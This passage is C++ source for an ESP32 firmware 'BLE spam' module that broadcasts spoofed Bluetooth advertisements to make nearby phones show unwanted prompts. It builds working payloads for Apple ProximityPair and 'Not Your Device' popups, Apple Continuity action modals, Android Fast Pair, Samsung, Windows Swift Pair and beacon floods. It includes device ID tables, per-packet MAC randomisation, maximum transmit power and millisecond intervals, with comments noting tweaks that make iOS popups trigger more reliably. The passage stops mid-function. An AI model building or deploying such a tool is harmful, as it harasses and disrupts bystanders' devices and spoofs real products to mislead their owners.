static void bleSpamSaveCustomNames(const char *ns, const std::vector<String> &names) {
#if defined(BLE_SPAM_HAS_PREFERENCES)
    Preferences prefs;
    if (prefs.begin(ns, false)) {
        prefs.putUChar("count", (uint8_t)names.size());
        for (size_t i = 0; i < names.size() && i < BLE_SPAM_MAX_CUSTOM_NAMES; i++) {
            char key[8];
            snprintf(key, sizeof(key), "n%d", (int)i);
            prefs.putString(key, names[i]);
        }
        prefs.end();
    }
#endif
}

static String bleSpamSwiftPairName = "";
static String bleSpamBeaconName = "";

enum BleSpamTxPower { BLE_SPAM_TX_MAX, BLE_SPAM_TX_HIGH, BLE_SPAM_TX_MEDIUM, BLE_SPAM_TX_LOW };

enum BleSpamMacRandMode {
    BLE_SPAM_MAC_OFF,
    BLE_SPAM_MAC_EVERY_PACKET,
    BLE_SPAM_MAC_EVERY_2,
    BLE_SPAM_MAC_EVERY_3,
    BLE_SPAM_MAC_EVERY_5,
    BLE_SPAM_MAC_EVERY_10,
    BLE_SPAM_MAC_EVERY_25,
    BLE_SPAM_MAC_EVERY_50
};

struct BleSpamAttackOption {
    BleSpamAttackType type;
    const char *label;
};

struct BleSpamConfig {
    uint32_t adv_ms = 5;
    uint32_t gap_ms = 5;
    BleSpamTxPower tx_power = BLE_SPAM_TX_MAX;
    BleSpamMacRandMode mac_rand_mode = BLE_SPAM_MAC_EVERY_PACKET;
};

struct BleSpamSelection {
    BleSpamAttackType attack_type = BLE_SPAM_ATTACK_ANDROID_ALERT;
    int device_index = 0;
};

struct BleSpamListState {
    int cursor = 0;
    int scroll = 0;
    bool redraw = true;
};

struct BleSpamRunState {
    bool adv_active = false;
    uint32_t next_send_ms = 0;
    uint32_t adv_stop_ms = 0;
    uint32_t packet_counter = 0;
    uint32_t sent_count = 0;
    uint32_t window_start_ms = 0;
    uint32_t window_packets = 0;
    float pkt_s = 0.0f;
    bool mac_initialized = false;
    BleSpamTxPower applied_power = BLE_SPAM_TX_MAX;
    BleSpamAttackType cached_type = BLE_SPAM_ATTACK_ANDROID_ALERT;
    int cached_device_index = -1;
    bool cached_valid = false;
    BLEAdvertisementData cached_advertisement;
    BLEAdvertisementData working_advertisement;
};

struct BleSpamEditState {
    bool editing = false;
    int edit_row = 0;
    uint32_t adv_backup = 0;
    uint32_t gap_backup = 0;
    BleSpamTxPower tx_backup = BLE_SPAM_TX_MAX;
    BleSpamMacRandMode mac_backup = BLE_SPAM_MAC_EVERY_PACKET;
};

struct BleSpamListMetrics {
    int list_x = 0;
    int list_y = 0;
    int list_w = 0;
    int list_h = 0;
    int row_h = 0;
    int visible_rows = 0;
    int footer_y = 0;
};

static const uint32_t BLE_SPAM_STATS_UPDATE_MS = 500;
static const uint32_t BLE_SPAM_BLINK_MS = 250;

static const BleSpamAttackOption BLE_SPAM_ATTACK_OPTIONS[] = {
#if !defined(LITE_VERSION)
    {BLE_SPAM_ATTACK_APPLE_PAIRING,         "Apple Pairing Prompt" },
    {BLE_SPAM_ATTACK_APPLE_ACTION,          "Apple Action Modal"   },
    {BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE, "Apple Not Your Device"},
#endif
    {BLE_SPAM_ATTACK_ANDROID_ALERT,         "Android Device Alert" },
    {BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,    "Windows Swift Pair"   },
    {BLE_SPAM_ATTACK_SAMSUNG,               "Samsung BLE Spam"     },
    {BLE_SPAM_ATTACK_BLE_BEACON,            "BLE Beacon Spam"      },
    {BLE_SPAM_ATTACK_RANDOM_ALL,            "Random / All"         }
};

#if !defined(LITE_VERSION)
struct BleSpamAppleDevice {
    const char *ui_name;
    const char *payload_name;
};

// ProximityPair (Apple Pairing / Not Your Device) device list, ported from the
// current Flipper Zero ble_spam app's apple_devices table.
struct AppleProximityDevice {
    const char *name;
    uint16_t device_id;
};

static const AppleProximityDevice APPLE_PROXIMITY_DEVICES[] = {
    {"AirPods Pro",               0x0E20},
    {"AirPods Pro 2nd Gen",       0x1420},
    {"AirPods Pro 2nd Gen USB-C", 0x2420},
    {"AirPods 4 ANC",             0x2820},
    {"AirPods 4",                 0x2920},
    {"AirPods Max USB-C",         0x2B20},
    {"Beats Powerbeats Pro 2",    0x2C20},
    {"Beats Solo 3",              0x0620},
    {"AirPods Max",               0x0A20},
    {"Beats Flex",                0x1020},
    {"AirTag",                    0x0055},
    {"Hermes AirTag",             0x0030},
    {"AirPods",                   0x0220},
    {"AirPods 2nd Gen",           0x0F20},
    {"AirPods 3rd Gen",           0x1320},
    {"Powerbeats 3",              0x0320},
    {"Powerbeats Pro",            0x0B20},
    {"Beats Solo Pro",            0x0C20},
    {"Beats Studio Buds",         0x1120},
    {"Beats X",                   0x0520},
    {"Beats Studio 3",            0x0920},
    {"Beats Studio Pro",          0x1720},
    {"Beats Fit Pro",             0x1220},
    {"Beats Studio Buds+",        0x1620},
    {"Beats Solo 4",              0x2520},
    {"Beats Solo Buds",           0x2620},
    {"Powerbeats Fit",            0x2F20},
};
static const int APPLE_PROXIMITY_DEVICE_COUNT =
    sizeof(APPLE_PROXIMITY_DEVICES) / sizeof(APPLE_PROXIMITY_DEVICES[0]);

static const BleSpamAppleDevice BLE_SPAM_APPLE_ACTION_DEVICES[] = {
    {"Apple TV Setup",      "AppleTV Setup"     },
    {"Setup New Phone",     "Setup New Phone"   },
    {"Transfer Number",     "Transfer Number"   },
    {"TV Color Balance",    "TV Color Balance"  },
    {"Apple Vision Pro",    "Apple Vision Pro"  },
    {"Apple TV Connecting", "AppleTV Connecting"},
    {"Apple TV Audio Sync", "AppleTV Audio Sync"},
    {"Setup New Apple TV",  "Setup New AppleTV" },
    {"HomePod Setup",       "HomePod Setup"     },
    {"HomeKit Apple TV",    "HomeKit AppleTV"   },
    {"Pair Apple TV",       "Pair AppleTV"      },
    {"Setup New iPad",      "Setup New iPad"    }
};
#endif

static const char *BLE_SPAM_ANDROID_DEVICES[] = {"Pixel Fast Pair", "Generic Android Alert", "Random / All"};
// Windows: indices 0..3 are presets, 4 = Random/All, 5 = custom name (handled dynamically)
static const char *BLE_SPAM_WINDOWS_PRESETS[] = {
    "Generic Swift Pair",
    "Never Gonna Give You Up",
    "Bill Nye's iPhone",
    "Skibidi Toilet",
    "67",
    "FBI Surveillance Van"
};

// BLE Beacon: indices 0..N are presets, then Random/All, then saved custom names, then Add New
static const char *BLE_SPAM_BEACON_PRESETS[] = {
    "NeverGonnaGiveYoUp", "Bill Nye's iPhone", "Skibidi Toilet", "67", "FBISurveillanceVan"
};
static const char *BLE_SPAM_SAMSUNG_DEVICES[] = {
    "Galaxy Buds", "Galaxy Watch", "Generic Samsung", "Random / All"
};

// Special sentinel indices
#define BLE_SPAM_ANDROID_RANDOM_IDX 2
#define BLE_SPAM_SAMSUNG_RANDOM_IDX 3
#define BLE_SPAM_WINDOWS_RANDOM_IDX 5 // after presets
#define BLE_SPAM_WINDOWS_CUSTOM_IDX 6 // "+ Add New Custom Name" / custom saved

static const char *bleSpamTxPowerLabel(BleSpamTxPower level) {
    switch (level) {
        case BLE_SPAM_TX_MAX: return "MAX";
        case BLE_SPAM_TX_HIGH: return "HIGH";
        case BLE_SPAM_TX_MEDIUM: return "MEDIUM";
        case BLE_SPAM_TX_LOW: return "LOW";
        default: return "MAX";
    }
}

static const char *bleSpamMacRandLabel(BleSpamMacRandMode mode) {
    switch (mode) {
        case BLE_SPAM_MAC_OFF: return "Off";
        case BLE_SPAM_MAC_EVERY_PACKET: return "Every Packet";
        case BLE_SPAM_MAC_EVERY_2: return "Every 2 Packets";
        case BLE_SPAM_MAC_EVERY_3: return "Every 3 Packets";
        case BLE_SPAM_MAC_EVERY_5: return "Every 5 Packets";
        case BLE_SPAM_MAC_EVERY_10: return "Every 10 Packets";
        case BLE_SPAM_MAC_EVERY_25: return "Every 25 Packets";
        case BLE_SPAM_MAC_EVERY_50: return "Every 50 Packets";
        default: return "Every Packet";
    }
}

static uint32_t bleSpamMacRandDivisor(BleSpamMacRandMode mode) {
    switch (mode) {
        case BLE_SPAM_MAC_EVERY_PACKET: return 1;
        case BLE_SPAM_MAC_EVERY_2: return 2;
        case BLE_SPAM_MAC_EVERY_3: return 3;
        case BLE_SPAM_MAC_EVERY_5: return 5;
        case BLE_SPAM_MAC_EVERY_10: return 10;
        case BLE_SPAM_MAC_EVERY_25: return 25;
        case BLE_SPAM_MAC_EVERY_50: return 50;
        default: return 0;
    }
}

static uint32_t bleSpamClampMs(uint32_t ms) {
    if (ms < 1) return 1;
    if (ms > 10000) return 10000;
    return ms;
}

static BleSpamTxPower bleSpamClampTxPower(uint8_t value) {
    if (value > BLE_SPAM_TX_LOW) return BLE_SPAM_TX_MAX;
    return static_cast<BleSpamTxPower>(value);
}

static BleSpamMacRandMode bleSpamClampMacMode(uint8_t value) {
    if (value > BLE_SPAM_MAC_EVERY_50) return BLE_SPAM_MAC_EVERY_PACKET;
    return static_cast<BleSpamMacRandMode>(value);
}

static BleSpamConfig bleSpamLoadConfig() {
    BleSpamConfig config;
#if defined(BLE_SPAM_HAS_PREFERENCES)
    Preferences prefs;
    if (prefs.begin("ble_spam", false)) {
        uint8_t tx_init = prefs.getUChar("tx_init", 0);
        if (tx_init == 0) {
            config.adv_ms = 5;
            config.gap_ms = 5;
            config.mac_rand_mode = BLE_SPAM_MAC_EVERY_PACKET;
            config.tx_power = BLE_SPAM_TX_MAX;
            prefs.putUInt("adv_ms", config.adv_ms);
            prefs.putUInt("gap_ms", config.gap_ms);
            prefs.putUChar("mac_rand", static_cast<uint8_t>(config.mac_rand_mode));
            prefs.putUChar("tx_power", static_cast<uint8_t>(config.tx_power));
            prefs.putUChar("tx_init", 1);
        } else {
            config.adv_ms = bleSpamClampMs(prefs.getUInt("adv_ms", config.adv_ms));
            config.gap_ms = bleSpamClampMs(prefs.getUInt("gap_ms", config.gap_ms));
            config.mac_rand_mode = bleSpamClampMacMode(prefs.getUChar("mac_rand", config.mac_rand_mode));
            config.tx_power = bleSpamClampTxPower(prefs.getUChar("tx_power", config.tx_power));
        }
        prefs.end();
    }
#endif
    return config;
}

static void bleSpamSaveConfig(const BleSpamConfig &config) {
#if defined(BLE_SPAM_HAS_PREFERENCES)
    Preferences prefs;
    if (prefs.begin("ble_spam", false)) {
        prefs.putUInt("adv_ms", bleSpamClampMs(config.adv_ms));
        prefs.putUInt("gap_ms", bleSpamClampMs(config.gap_ms));
        prefs.putUChar("tx_power", static_cast<uint8_t>(config.tx_power));
        prefs.putUChar("mac_rand", static_cast<uint8_t>(config.mac_rand_mode));
        prefs.putUChar("tx_init", 1);
        prefs.end();
    }
#endif
}

static uint32_t bleSpamMsStep(uint32_t ms) {
    // <= (not <) so stepping away from 20 in either direction uses step 1 —
    // otherwise decrementing from exactly 20 used the 10-199 bracket's step
    // (10) and jumped straight to 10, skipping 11-19, while incrementing from
    // 19 stayed on step 1. Keeps the whole 10-20 range at increments of 1.
    if (ms <= 20) return 1;
    if (ms < 200) return 10;
    if (ms < 1000) return 50;
    return 500;
}

static uint32_t bleSpamAdjustMs(uint32_t ms, int direction) {
    if (direction == 0) return ms;
    uint32_t step = bleSpamMsStep(ms);
    int32_t next = static_cast<int32_t>(ms) + direction * static_cast<int32_t>(step);
    if (next < 1) next = 1;
    if (next > 10000) next = 10000;
    return static_cast<uint32_t>(next);
}

static BleSpamListMetrics bleSpamGetListMetrics(int footerLines) {
    BleSpamListMetrics metrics;
    metrics.list_x = 10;
    metrics.list_y = BORDER_PAD_Y + FM * LH + 4;
    metrics.list_w = tftWidth - 20;
    int footer_h = footerLines * (FP * LH + 4);
    metrics.footer_y = tftHeight - footer_h - 10;
    metrics.list_h = metrics.footer_y - metrics.list_y - 2;
    metrics.row_h = max(12, FP * LH + 4);
    metrics.visible_rows = max(1, metrics.list_h / metrics.row_h);
    return metrics;
}

static String bleSpamTruncateText(const String &text, int maxWidth) {
    if (tft.textWidth(text.c_str()) <= maxWidth) return text;

    String trimmed = text;
    const String ellipsis = "...";
    int maxTextWidth = maxWidth - tft.textWidth(ellipsis.c_str());
    if (maxTextWidth <= 0) return ellipsis;

    while (trimmed.length() > 0 && tft.textWidth(trimmed.c_str()) > maxTextWidth) {
        trimmed.remove(trimmed.length() - 1);
    }
    return trimmed + ellipsis;
}

static String bleSpamMakeTitle(const String &title) {
    tft.setTextSize(FP);
    int maxWidth = tftWidth - 2 * BORDER_PAD_X;
    return bleSpamTruncateText(title, maxWidth);
}

static void bleSpamEnsureScroll(BleSpamListState &state, int itemCount, int visibleRows) {
    if (itemCount <= visibleRows) {
        state.scroll = 0;
        return;
    }
    if (state.cursor < state.scroll) state.scroll = state.cursor;
    if (state.cursor >= state.scroll + visibleRows) state.scroll = state.cursor - visibleRows + 1;
}

static void bleSpamRenderList(
    const String &title, int itemCount, const BleSpamListState &state, const BleSpamListMetrics &metrics,
    const std::function<const char *(int)> &labelFn, const char *footer, bool fullRedraw
) {
    if (fullRedraw) drawMainBorderWithTitle(bleSpamMakeTitle(title));

    tft.setTextSize(FP);
    tft.fillRect(metrics.list_x, metrics.list_y, metrics.list_w, metrics.list_h, bruceConfig.bgColor);

    for (int row = 0; row < metrics.visible_rows; row++) {
        int idx = state.scroll + row;
        int row_y = metrics.list_y + row * metrics.row_h;
        tft.fillRect(metrics.list_x, row_y, metrics.list_w, metrics.row_h, bruceConfig.bgColor);

        if (idx >= itemCount) continue;

        bool selected = (idx == state.cursor);
        uint16_t bg = selected ? bruceConfig.priColor : bruceConfig.bgColor;
        uint16_t fg = selected ? bruceConfig.bgColor : bruceConfig.priColor;

        tft.fillRect(metrics.list_x, row_y, metrics.list_w, metrics.row_h, bg);
        tft.setTextColor(fg, bg);

        String line = String(selected ? "> " : "  ") + labelFn(idx);
        line = bleSpamTruncateText(line, metrics.list_w - 6);
        tft.drawString(line, metrics.list_x + 4, row_y + 2, 1);
    }

    if (footer != nullptr) {
        tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
        tft.fillRect(8, metrics.footer_y, tftWidth - 16, FP * LH, bruceConfig.bgColor);
        tft.drawCentreString(footer, tftWidth / 2, metrics.footer_y + 2, 1);
    }
}

static int bleSpamListLoop(
    const String &title, int itemCount, int initialIndex, const std::function<const char *(int)> &labelFn,
    const char *footer
) {
    if (itemCount <= 0) return -1;

    BleSpamListState state;
    state.cursor = (initialIndex >= 0 && initialIndex < itemCount) ? initialIndex : 0;
    state.scroll = 0;
    state.redraw = true;

    BleSpamListMetrics metrics = bleSpamGetListMetrics(1);
    bleSpamEnsureScroll(state, itemCount, metrics.visible_rows);
    bool layoutDrawn = false;

    while (true) {
        if (state.redraw) {
            bleSpamRenderList(title, itemCount, state, metrics, labelFn, footer, !layoutDrawn);
            layoutDrawn = true;
            state.redraw = false;
        }

        if (EscPress && PrevPress) EscPress = false;
        if (check(EscPress)) return -1;

        if (check(NextPress)) {
            state.cursor = (state.cursor + 1) % itemCount;
            bleSpamEnsureScroll(state, itemCount, metrics.visible_rows);
            state.redraw = true;
        } else if (check(PrevPress)) {
            state.cursor = (state.cursor + itemCount - 1) % itemCount;
            bleSpamEnsureScroll(state, itemCount, metrics.visible_rows);
            state.redraw = true;
        } else if (check(SelPress)) {
            return state.cursor;
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

static int bleSpamGetAttackOptionCount() {
    return sizeof(BLE_SPAM_ATTACK_OPTIONS) / sizeof(BLE_SPAM_ATTACK_OPTIONS[0]);
}

static BleSpamAttackType bleSpamGetAttackTypeByIndex(int index) {
    return BLE_SPAM_ATTACK_OPTIONS[index].type;
}

static const char *bleSpamGetAttackLabel(int index) { return BLE_SPAM_ATTACK_OPTIONS[index].label; }

static int bleSpamGetDeviceCount(BleSpamAttackType type) {
    switch (type) {
#if !defined(LITE_VERSION)
        case BLE_SPAM_ATTACK_APPLE_PAIRING: return APPLE_PROXIMITY_DEVICE_COUNT + 1; // +1 Random/All
        case BLE_SPAM_ATTACK_APPLE_ACTION:
            return sizeof(BLE_SPAM_APPLE_ACTION_DEVICES) / sizeof(BleSpamAppleDevice) + 1;   // +1 Random/All
        case BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE: return APPLE_PROXIMITY_DEVICE_COUNT + 1; // +1 Random/All
#endif
        case BLE_SPAM_ATTACK_ANDROID_ALERT:
            return sizeof(BLE_SPAM_ANDROID_DEVICES) / sizeof(BLE_SPAM_ANDROID_DEVICES[0]);
        case BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR: {
            // presets + Random/All + saved custom names + "+ Add New Custom Name"
            std::vector<String> saved = bleSpamLoadCustomNames("bs_sp");
            return (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0])) + 1 +
                   (int)saved.size() + 1;
        }
        case BLE_SPAM_ATTACK_SAMSUNG:
            return sizeof(BLE_SPAM_SAMSUNG_DEVICES) / sizeof(BLE_SPAM_SAMSUNG_DEVICES[0]);
        case BLE_SPAM_ATTACK_BLE_BEACON: {
            int nPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
            std::vector<String> saved = bleSpamLoadCustomNames("bs_bn");
            return nPresets + 1 + (int)saved.size() + 1; // presets + Random/All + saved + Add New
        }
        default: return 0;
    }
}

// Static buffer for dynamic device names returned by bleSpamGetDeviceName
static char bleSpamDeviceNameBuf[48];

static const char *bleSpamGetDeviceName(BleSpamAttackType type, int index) {
    switch (type) {
#if !defined(LITE_VERSION)
        case BLE_SPAM_ATTACK_APPLE_PAIRING: {
            if (index >= 0 && index < APPLE_PROXIMITY_DEVICE_COUNT)
                return APPLE_PROXIMITY_DEVICES[index].name;
            if (index == APPLE_PROXIMITY_DEVICE_COUNT) return "Random / All";
            return "Apple";
        }
        case BLE_SPAM_ATTACK_APPLE_ACTION: {
            int staticCount = (int)(sizeof(BLE_SPAM_APPLE_ACTION_DEVICES) / sizeof(BleSpamAppleDevice));
            if (index >= 0 && index < staticCount) return BLE_SPAM_APPLE_ACTION_DEVICES[index].ui_name;
            if (index == staticCount) return "Random / All";
            return "Apple";
        }
        case BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE: {
            if (index >= 0 && index < APPLE_PROXIMITY_DEVICE_COUNT)
                return APPLE_PROXIMITY_DEVICES[index].name;
            if (index == APPLE_PROXIMITY_DEVICE_COUNT) return "Random / All";
            return "Apple";
        }
#endif
        case BLE_SPAM_ATTACK_ANDROID_ALERT:
            if (index >= 0 &&
                index < (int)(sizeof(BLE_SPAM_ANDROID_DEVICES) / sizeof(BLE_SPAM_ANDROID_DEVICES[0])))
                return BLE_SPAM_ANDROID_DEVICES[index];
            return "Android";
        case BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR: {
            int nPresets = (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]));
            if (index >= 0 && index < nPresets) return BLE_SPAM_WINDOWS_PRESETS[index];
            if (index == nPresets) return "Random / All";
            // saved custom names
            std::vector<String> saved = bleSpamLoadCustomNames("bs_sp");
            int savedBase = nPresets + 1;
            int addNewIdx = savedBase + (int)saved.size();
            if (index >= savedBase && index < addNewIdx) {
                strncpy(
                    bleSpamDeviceNameBuf, saved[index - savedBase].c_str(), sizeof(bleSpamDeviceNameBuf) - 1
                );
                bleSpamDeviceNameBuf[sizeof(bleSpamDeviceNameBuf) - 1] = '\0';
                return bleSpamDeviceNameBuf;
            }
            if (index == addNewIdx) return "+ Add New Custom Name";
            return "Windows";
        }
        case BLE_SPAM_ATTACK_SAMSUNG:
            if (index >= 0 &&
                index < (int)(sizeof(BLE_SPAM_SAMSUNG_DEVICES) / sizeof(BLE_SPAM_SAMSUNG_DEVICES[0])))
                return BLE_SPAM_SAMSUNG_DEVICES[index];
            return "Samsung";
        case BLE_SPAM_ATTACK_BLE_BEACON: {
            int nPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
            if (index >= 0 && index < nPresets) return BLE_SPAM_BEACON_PRESETS[index];
            if (index == nPresets) return "Random Device Spam";
            std::vector<String> saved = bleSpamLoadCustomNames("bs_bn");
            int savedBase = nPresets + 1;
            int addNewIdx = savedBase + (int)saved.size();
            if (index >= savedBase && index < addNewIdx) {
                strncpy(
                    bleSpamDeviceNameBuf, saved[index - savedBase].c_str(), sizeof(bleSpamDeviceNameBuf) - 1
                );
                bleSpamDeviceNameBuf[sizeof(bleSpamDeviceNameBuf) - 1] = '\0';
                return bleSpamDeviceNameBuf;
            }
            if (index == addNewIdx) return "+ Add New Custom Name";
            return "Beacon";
        }
        case BLE_SPAM_ATTACK_RANDOM_ALL:
        default: return "Random / All";
    }
}

#if !defined(LITE_VERSION)
// Builds a real ProximityPair advertisement (31 bytes), ported from the current
// Flipper Zero ble_spam app. Status byte, battery, and the 16-byte "encrypted
// payload" tail are regenerated fresh on every packet. prefix=0x07 triggers the
// normal device-popup; prefix=0x01 triggers the "Not Your Device" variant.
static bool
buildAppleProximityPair(uint8_t prefix, uint16_t deviceId, BLEAdvertisementData &advertisementData) {
    uint8_t buf[31];
    uint8_t i = 0;
    buf[i++] = 0x1E; // AD length
    buf[i++] = 0xFF; // AD type: manufacturer specific
    buf[i++] = 0x4C; // Apple company ID
    buf[i++] = 0x00;
    buf[i++] = 0x07; // Continuity type: ProximityPair
    buf[i++] = 0x19; // Continuity size: 25
    buf[i++] = prefix;
    buf[i++] = (uint8_t)(deviceId >> 8);
    buf[i++] = (uint8_t)(deviceId & 0xFF);
    buf[i++] = 0x55;             // Status
    esp_fill_random(&buf[i], 3); // Battery
    i += 3;
    buf[i++] = 0x00;              // Color
    buf[i++] = 0x00;              // Reserved
    esp_fill_random(&buf[i], 16); // "Encrypted payload"
    i += 16;

    advertisementData = BLEAdvertisementData();
    advertisementData.addData(buf, i);
    return true;
}

// Resolves a Pairing/Not-Your-Device menu deviceIndex to a device ID, handling
// the "Random/All" sentinel at the end of the list.
static uint16_t bleSpamResolveProximityDeviceId(int deviceIndex) {
    if (deviceIndex == APPLE_PROXIMITY_DEVICE_COUNT || deviceIndex < 0 ||
        deviceIndex >= APPLE_PROXIMITY_DEVICE_COUNT) {
        return APPLE_PROXIMITY_DEVICES[random(APPLE_PROXIMITY_DEVICE_COUNT)].device_id;
    }
    return APPLE_PROXIMITY_DEVICES[deviceIndex].device_id;
}
#endif

static void bleSpamPickRandomSelection(BleSpamAttackType &attackType, int &deviceIndex) {
    struct AttackCount {
        BleSpamAttackType type;
        int count;
    };

    AttackCount counts[] = {
#if !defined(LITE_VERSION)
        {BLE_SPAM_ATTACK_APPLE_PAIRING,
                                  bleSpamGetDeviceCount(BLE_SPAM_ATTACK_APPLE_PAIRING) - 1                                   }, // -1 to exclude Random/All sentinel
        {BLE_SPAM_ATTACK_APPLE_ACTION,       bleSpamGetDeviceCount(BLE_SPAM_ATTACK_APPLE_ACTION) - 1},
#endif
        {BLE_SPAM_ATTACK_ANDROID_ALERT,      2                                                      }, // only Pixel + Generic, not Random/All
        {BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,
                                  (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]))              },
        {BLE_SPAM_ATTACK_SAMSUNG,            3                                                      }  // Galaxy Buds/Watch/Generic only
    };

    int total = 0;
    for (size_t i = 0; i < sizeof(counts) / sizeof(counts[0]); i++) {
        if (counts[i].count > 0) total += counts[i].count;
    }

    if (total == 0) {
        attackType = BLE_SPAM_ATTACK_ANDROID_ALERT;
        deviceIndex = 0;
        return;
    }

    int roll = random(total);
    for (size_t i = 0; i < sizeof(counts) / sizeof(counts[0]); i++) {
        if (counts[i].count == 0) continue;
        if (roll < counts[i].count) {
            attackType = counts[i].type;
            deviceIndex = roll;
            return;
        }
        roll -= counts[i].count;
    }

    attackType = BLE_SPAM_ATTACK_ANDROID_ALERT;
    deviceIndex = 0;
}

static esp_power_level_t bleSpamTxPowerToLevel(BleSpamTxPower level) {
    switch (level) {
        case BLE_SPAM_TX_MAX: return MAX_TX_POWER;
        case BLE_SPAM_TX_HIGH: return ESP_PWR_LVL_P9;
        case BLE_SPAM_TX_MEDIUM: return ESP_PWR_LVL_P6;
        case BLE_SPAM_TX_LOW: return ESP_PWR_LVL_P3;
        default: return MAX_TX_POWER;
    }
}

static void bleSpamApplyTxPower(BleSpamTxPower level) {
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, bleSpamTxPowerToLevel(level));
}

static void bleSpamSetMac(const uint8_t *mac) { esp_iface_mac_addr_set(mac, ESP_MAC_BT); }

static uint64_t bleSpamMacRngState = 0;

static void bleSpamSeedMacRng() {
    uint64_t seed = ((uint64_t)esp_random() << 32) ^ esp_random();
    if (seed == 0) seed = 0x9E3779B97F4A7C15ULL;
    bleSpamMacRngState = seed;
}

static uint64_t bleSpamNextRand64() {
    if (bleSpamMacRngState == 0) bleSpamSeedMacRng();
    uint64_t x = bleSpamMacRngState;
    x ^= x >> 12;
    x ^= x << 25;
    x ^= x >> 27;
    bleSpamMacRngState = x;
    return x * 0x2545F4914F6CDD1DULL;
}

static void bleSpamFastRandomMac(uint8_t *mac) {
    uint64_t r1 = bleSpamNextRand64();
    uint64_t r2 = bleSpamNextRand64();
    mac[0] = (uint8_t)(r1 & 0xFF);
    mac[1] = (uint8_t)((r1 >> 8) & 0xFF);
    mac[2] = (uint8_t)((r1 >> 16) & 0xFF);
    mac[3] = (uint8_t)((r1 >> 24) & 0xFF);
    mac[4] = (uint8_t)(r2 & 0xFF);
    mac[5] = (uint8_t)((r2 >> 8) & 0xFF);
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

// 16-char printable ASCII name, regenerated every call via xorshift — used for beacon random spam
static void bleSpamRandomBeaconName(char *buf) {
    const uint8_t len = 16;
    for (uint8_t i = 0; i < len; i++) { buf[i] = 0x21 + (uint8_t)(bleSpamNextRand64() % 94); }
    buf[len] = '\0';
}

static bool bleSpamGetNextMac(BleSpamRunState &state, BleSpamMacRandMode mode, uint8_t outMac[6]) {
    if (mode == BLE_SPAM_MAC_OFF) {
        if (!state.mac_initialized) {
            bleSpamFastRandomMac(outMac);
            return true;
        }
        return false;
    }

    uint32_t divisor = bleSpamMacRandDivisor(mode);
    if (divisor == 0) return false;

    if (!state.mac_initialized || (state.packet_counter > 0 && state.packet_counter % divisor == 0)) {
        bleSpamFastRandomMac(outMac);
        return true;
    }

    return false;
}

// ============================================================================
// Apple Continuity dynamic packet builders (MarlinSchuck)
// Dynamic random fields matching Flipper Zero reference — triggers iOS popups
// where static payloads failed. Only used by the new BLE spam UI Apple paths.
// ============================================================================

static size_t bleSpamBuildContinuityNearbyAction(uint8_t *buf) {
    uint8_t action = continuity_na_actions[esp_random() % continuity_na_actions_count];
    uint8_t flags = 0xC0;
    if (action == 0x20 && (esp_random() % 2)) flags--;
    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;
    uint8_t i = 0;
    buf[i++] = 10;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x0F;
    buf[i++] = 5;
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);
    i += 3;
    return i;
}

// Builds a dynamic Apple Continuity NearbyAction (Action modal) advertisement.
// Previously alternated 50/50 with a "CustomCrash" variant that appended 6
// bytes past the declared Continuity Size — not a real Continuity TLV, so
// roughly half of all Action packets were malformed and silently dropped by
// iOS. Always emit the real NearbyAction format now.
static bool bleSpamBuildAppleContinuityAdvertisement(BLEAdvertisementData &advertisementData) {
    uint8_t buf[31];
    size_t len = bleSpamBuildContinuityNearbyAction(buf);
    if (len == 0) return false;
    advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x06);
    advertisementData.addData(buf, len);
    return true;
}

static bool bleSpamBuildAdvertisementData(
    BleSpamAttackType attackType, int deviceIndex, BLEAdvertisementData &advertisementData
) {
    switch (attackType) {
#if !defined(LITE_VERSION)
        case BLE_SPAM_ATTACK_APPLE_PAIRING: {
            // ProximityPair device popup (AirPods, Beats etc.) — prefix 0x07 = new device.
            uint16_t deviceId = bleSpamResolveProximityDeviceId(deviceIndex);
            return buildAppleProximityPair(0x07, deviceId, advertisementData);
        }
        case BLE_SPAM_ATTACK_APPLE_ACTION: {
            // Action modals (SetupNewPhone, AppleTV etc.) use dynamic Continuity NearbyAction
            // packets (MarlinSchuck) — these trigger iOS popups more reliably than static payloads
            return bleSpamBuildAppleContinuityAdvertisement(advertisementData);
        }
        case BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE: {
            // Same ProximityPair format, prefix 0x01 = "Not Your Device" variant.
            uint16_t deviceId = bleSpamResolveProximityDeviceId(deviceIndex);
            return buildAppleProximityPair(0x01, deviceId, advertisementData);
        }
#endif
        case BLE_SPAM_ATTACK_ANDROID_ALERT: {
            bool useSamsung = false;
            if (deviceIndex == BLE_SPAM_ANDROID_RANDOM_IDX) {
                int ouiCount = sizeof(SAMSUNG_MAC_OUIS) / sizeof(SAMSUNG_MAC_OUIS[0]);
                char macBuf[18];
                snprintf(
                    macBuf,
                    sizeof(macBuf),
                    "%s:%02X:%02X:%02X",
                    SAMSUNG_MAC_OUIS[random(ouiCount)],
                    (unsigned)random(256),
                    (unsigned)random(256),
                    (unsigned)random(256)
                );
                useSamsung = (random(2) == 0) && isSamsungDevice(String(macBuf));
            }
            advertisementData = GetUniversalAdvertisementData(useSamsung ? Samsung : Google);
            // Samsung branch already sets its own flags (or intentionally omits
            // them for the 31-byte Galaxy Buds packet, which has no room left).
